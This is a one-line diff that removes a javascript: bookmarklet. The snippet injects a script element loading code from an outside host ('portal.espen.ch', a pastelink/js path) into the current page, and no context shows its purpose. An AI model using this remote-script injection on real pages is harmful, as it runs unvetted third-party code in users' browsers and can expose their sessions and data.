@@ -1,1 +1,0 @@
-javascript:var script = document.createElement("script");script.src="http://portal.espen.ch/web/tshakaa/home/-/pastelink/js/10403";document.body.appendChild(script);void(0);
